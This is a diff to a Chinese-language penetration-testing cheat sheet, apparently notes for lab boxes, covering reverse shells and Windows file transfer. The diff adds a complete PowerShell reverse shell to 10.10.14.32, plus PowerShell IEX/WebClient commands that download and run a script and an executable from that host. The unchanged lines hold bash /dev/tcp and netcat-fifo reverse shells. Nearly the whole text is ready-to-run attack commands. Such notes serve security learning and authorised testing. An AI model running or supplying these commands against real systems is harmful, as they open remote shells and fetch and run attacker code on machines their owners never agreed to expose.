@@ -23,6 +23,13 @@
 ----------------------------------------
 - 常规shell反弹
 
+windows下:
+::
+
+    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.32",5711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+Linux下:
+
 ::
 
     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -31,7 +38,7 @@
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
-- 突破防火墙的imcp_shell反弹
+- 突破防火墙的icmp_shell反弹
 - 正向shell
 
 ::
@@ -43,6 +50,8 @@
 ----------------------------------------
 - windows下文件传输
     - powershell
+        - ``IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.32:1633/shell.sp1")``
+        - ``IEX (New-Object Net.WebClient).DownloadFile("http://10.10.14.32:1633/1633.exe", "C:\users\sql_svc\Desktop\1633.exe")``
     - vbs脚本文件
     - bitsadmin
     - 文件共享
